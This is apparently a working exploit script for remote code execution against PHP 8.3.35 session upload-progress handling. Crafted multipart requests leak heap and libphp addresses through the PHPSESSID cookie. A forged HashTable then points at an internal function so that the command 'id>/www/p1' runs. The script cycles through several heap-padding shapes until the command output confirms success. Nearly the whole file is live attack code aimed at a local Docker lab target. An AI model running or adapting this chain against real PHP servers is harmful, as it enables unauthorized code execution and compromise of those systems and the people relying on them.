#!/usr/bin/env python3
"""8.3.35 stage-3: vary the A2 setup-request pad shape to shift the
dangling PS(http_session_vars) allocation, keeping the B2 carrier write fixed.

For each (n_pads, pad_name_len, pad_val_len) combo:
  rotate -> stage1 -> rotate -> stage2 -> rotate -> A2(combo) -> B2(carrier) -> check
"""
import subprocess, sys, os, time, struct, socket, re, urllib.parse
from collections import Counter

PORT = 18112
CONTAINER = "p2s8335"
DTOR_OFFSET = 0x49ec50
ZIF_OFFSET = 0x3ac080
HTDATA_OFFSET = 0x690d8
CMD = "id>/www/p1"
FETCH = "/p1"
BIG_MB = 256

def log(m): print(m, flush=True)

def send_raw(port, body, timeout=60, path="/", boundary=b"C"*10, extra_headers=None):
    hdr = extra_headers or ""
    req = (f"POST {path} HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\n{hdr}"
           f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
           f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode()
    resp = bytearray()
    try:
        s = socket.create_connection(("127.0.0.1", port), timeout=timeout)
        s.settimeout(timeout)
        s.sendall(req + body)
        while len(resp) < (16 << 20):
            c = s.recv(65536)
            if not c: break
            resp.extend(c)
    except (OSError, ConnectionError): pass
    finally:
        try: s.close()
        except: pass
    return bytes(resp)

def build_multipart(parts, boundary):
    out = bytearray()
    for p in parts:
        name = p["name"].encode() if isinstance(p["name"], str) else p["name"]
        out += b"--" + boundary + b"\r\n"
        out += b'Content-Disposition: form-data; name="' + name + b'"'
        if p.get("filename"):
            out += b'; filename="' + p["filename"].encode() + b'"'
            out += b"\r\nContent-Type: application/octet-stream"
        out += b"\r\n\r\n" + p["data"] + b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)

def container_ok(port, timeout=3):
    try:
        s = socket.create_connection(("127.0.0.1", port), timeout=timeout)
        s.close(); return True
    except: return False

def restart():
    subprocess.run(["docker","restart",CONTAINER], capture_output=True, timeout=30)
    time.sleep(2.5)
    for _ in range(3):
        if container_ok(PORT): break
        time.sleep(1)
    # warmup
    try:
        s = socket.create_connection(("127.0.0.1", PORT), timeout=5)
        s.sendall(b"GET / HTTP/1.0\r\nHost: x\r\n\r\n")
        s.recv(1024); s.close()
    except: pass
    time.sleep(0.5)

def rotate(port):
    parts = [{"name": f"f{i:04d}"[:5], "data": b"V"*3000} for i in range(1001)]
    parts += [{"name":"PHPSESSID","data":b"\x00"},
              {"name":"PHP_SESSION_UPLOAD_PROGRESS","data":b"pwn"},
              {"name":"f","filename":"a.txt","data":b"A"*64},
              {"name":"big","data":b"B"*(BIG_MB*1024*1024)}]
    send_raw(port, build_multipart(parts, b"S"*17), timeout=120)
    time.sleep(0.4)
    parts2 = [{"name":"PHPSESSID","data":b"attacksessionid0001"},
              {"name":"PHP_SESSION_UPLOAD_PROGRESS","data":b"pwn"}]
    send_raw(port, build_multipart(parts2, b"BNDRY12345"), timeout=30)
    time.sleep(0.5)

def stage1(port, retries=3):
    for _ in range(retries):
        if not container_ok(port): restart()
        rotate(port)
        parts = [{"name":f"p{i:04d}","data":b"x"} for i in range(1001)]
        parts += [{"name":"PHPSESSID","data":b"\x00"},
                  {"name":"PHP_SESSION_UPLOAD_PROGRESS","data":b"pwn"},
                  {"name":"f","filename":"a.txt","data":b"A"*64},
                  {"name":"big","data":b"B"*(BIG_MB*1024*1024)}]
        send_raw(port, build_multipart(parts, b"S"*17), timeout=120)
        time.sleep(0.2)
        parts = [{"name":"PHPSESSID","data":b"attacksessionid0001"},
                 {"name":"PHP_SESSION_UPLOAD_PROGRESS","data":b"pwn"}]
        for i in range(841):
            val = (f"v{i:04d}"+"x"*44)[:48]
            parts.append({"name":str(1000+i),"data":val.encode()})
        forge = bytearray(b"A"*79)
        struct.pack_into("<Q", forge, 0x10, 0x1000)
        forge[0x18] = ord("L")
        parts.append({"name":"1999","data":bytes(forge)})
        resp = send_raw(port, build_multipart(parts, b"B"*10), timeout=60)
        base = parse_chunk_base(resp)
        if base: return base
        if not container_ok(port): restart()
    return 0

def stage2(port, retries=3):
    for _ in range(retries):
        if not container_ok(port): restart()
        rotate(port)
        parts = [{"name":f"f{i:04d}"[:5],"data":b"x"*39} for i in range(1001)]
        parts += [{"name":"PHPSESSID","data":b"\x00"},
                  {"name":"PHP_SESSION_UPLOAD_PROGRESS","data":b"pwn"},
                  {"name":"f","filename":"a.txt","data":b"A"*64},
                  {"name":"big","data":b"B"*(BIG_MB*1024*1024)}]
        send_raw(port, build_multipart(parts, b"S"*17), timeout=120)
        time.sleep(0.2)
        parts = [{"name":"PHPSESSID","data":b"attacksessionid0001"},
                 {"name":"PHP_SESSION_UPLOAD_PROGRESS","data":b"pwn"}]
        for i in range(983):
            cnt = 16 if i == 406 else 1
            for j in range(cnt):
                parts.append({"name":f"a{i:04d}[{j}]","data":b"x"*16})
        resp = send_raw(port, build_multipart(parts, b"B"*10), timeout=60)
        base = parse_libphp_base(resp, DTOR_OFFSET)
        if base: return base
        if not container_ok(port): restart()
    return 0

def parse_chunk_base(resp):
    m = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?); path=/", resp)
    if not m: return 0
    raw = urllib.parse.unquote_to_bytes(m.group(1).decode("latin1"))
    if len(raw) < 1000: return 0
    c = Counter()
    for i in range(len(raw)-8):
        v = int.from_bytes(raw[i:i+8],"little")
        if 0x7F0000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    if not c: return 0
    base, count = c.most_common(1)[0]
    return base if count >= 8 else 0

def parse_libphp_base(resp, dtor):
    m = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?); path=/", resp)
    if not m: return 0
    raw = urllib.parse.unquote_to_bytes(m.group(1).decode("latin1"))
    if len(raw) < 16: return 0
    p = int.from_bytes(raw[8:16],"little")
    if not (0x7F0000000000 <= p < 0x800000000000): return 0
    if p & 0xFFF != dtor & 0xFFF: return 0
    base = p - dtor
    return base if base & 0xFFF == 0 else 0

def get_proof(port):
    req = f"GET {FETCH} HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\nConnection: close\r\n\r\n".encode()
    try:
        s = socket.create_connection(("127.0.0.1", port), timeout=10)
        s.settimeout(10)
        s.sendall(req)
        data = b""
        while True:
            c = s.recv(65536)
            if not c: break
            data += c
        s.close()
        head, _, body = data.partition(b"\r\n\r\n")
        m2 = re.match(rb"HTTP/1\.[01] (\d{3})", head)
        return (int(m2.group(1)) if m2 else 0), body
    except: return 0, b""

def a2_setup(port, n_pads, nl, vl):
    """A2 setup request with custom pad shape."""
    parts = [
        {"name": "PHPSESSID", "data": b"a" * 19},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p" * 3},
    ]
    for i in range(n_pads):
        name = (f"p{i:0{nl - 1}d}" if nl > 0 else "")[:nl]
        parts.append({"name": name, "data": b"V" * vl})
    parts += [
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
        {"name": "big", "data": b"B" * (BIG_MB * 1024 * 1024)},
    ]
    extra = "Cookie: PHPSESSID=" + "a" * 32 + "\r\n"
    send_raw(port, build_multipart(parts, b"S"*17), timeout=120, extra_headers=extra)
    time.sleep(0.3)

def b2_write(port, htdata, zif):
    """B2 carrier write (fixed shape from our exploit)."""
    cmd = CMD.encode()
    ht = bytearray(b"\x00" * 167)
    struct.pack_into("<II", ht, 0x00, 1, 7)
    struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)
    struct.pack_into("<Q", ht, 0x10, htdata + 0x20)
    struct.pack_into("<II", ht, 0x18, 1, 1)
    struct.pack_into("<II", ht, 0x20, 8, 0)
    struct.pack_into("<Q", ht, 0x28, 0)
    struct.pack_into("<Q", ht, 0x30, zif)
    E = 0x20
    struct.pack_into("<Q", ht, E, 0); struct.pack_into("<Q", ht, E+8, 0)
    struct.pack_into("<Q", ht, E+0x10, zif); struct.pack_into("<Q", ht, E+0x18, 0)
    struct.pack_into("<Q", ht, E+0x20, 0); struct.pack_into("<I", ht, E+0x28, 0)
    struct.pack_into("<I", ht, E+0x2C, 1); struct.pack_into("<Q", ht, E+0x30, 0)
    struct.pack_into("<Q", ht, E+0x38, 0); struct.pack_into("<I", ht, E+0x40, 0)
    struct.pack_into("<Q", ht, E+0x50, htdata + 0x80); struct.pack_into("<I", ht, E+0x58, 6)
    struct.pack_into("<II", ht, 0x80, 1, 0x106)
    struct.pack_into("<Q", ht, 0x88, 0)
    struct.pack_into("<Q", ht, 0x90, len(cmd))
    ht[0x98:0x98+len(cmd)] = cmd
    ht[0x98+len(cmd)] = 0
    ht = bytes(ht)

    carrier = struct.pack("<II", 1, 0x1A) + struct.pack("<Q", htdata)[:7]
    parts = [
        {"name": "PHPSESSID", "data": b"attacksessionid0001"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f00", "data": b"F" * 15},
        {"name": "f01", "data": b"F" * 15},
        {"name": "g00", "data": carrier},
    ]
    for i in range(15):
        parts.append({"name": f"a{i:030d}"[:31], "data": ht})
    send_raw(port, build_multipart(parts, b"B"*10), timeout=30)

def main():
    log(f"[*] 8.3.35 A2-shape scan (B2 carrier fixed)")
    
    restart()
    log("[*] getting leaks...")
    chunk = stage1(PORT)
    if not chunk: log("[-] stage1 failed"); return 1
    log(f"[+] chunk=0x{chunk:x}")
    libphp = stage2(PORT)
    if not libphp: log("[-] stage2 failed"); return 1
    log(f"[+] libphp=0x{libphp:x}")
    
    htdata = chunk + HTDATA_OFFSET
    zif = libphp + ZIF_OFFSET
    
    # A2 shape combos: (n_pads, name_len, val_len)
    combos = [
        (6, 31, 31),   # bookworm baseline (known R+0xfd8)
        (4, 31, 31),
        (8, 31, 31),
        (10, 31, 31),
        (12, 31, 31),
        (6, 16, 16),
        (6, 48, 48),
        (6, 8, 8),
        (6, 64, 64),
        (3, 31, 31),
        (16, 31, 31),
        (20, 31, 31),
    ]
    
    for n_pads, nl, vl in combos:
        if not container_ok(PORT):
            restart()
            chunk = stage1(PORT)
            if not chunk: continue
            libphp = stage2(PORT)
            if not libphp: continue
            htdata = chunk + HTDATA_OFFSET
            zif = libphp + ZIF_OFFSET
        rotate(PORT)
        a2_setup(PORT, n_pads, nl, vl)
        b2_write(PORT, htdata, zif)
        time.sleep(0.8)
        status, body = get_proof(PORT)
        hit = (status == 200 and b"uid=" in body)
        log(f"  pads=({n_pads},{nl},{vl}) -> {'HIT' if hit else 'miss'} (http {status})")
        if hit:
            log(f"[+] RCE PROVEN! {body.decode('latin1').strip()}")
            log(f"[+] A2 shape: n_pads={n_pads} nl={nl} vl={vl}")
            return 0
        if not container_ok(PORT):
            log("  [!] worker died, restarting")
            restart()
    
    log("[-] no A2 shape worked")
    return 1

if __name__ == "__main__":
    sys.exit(main())
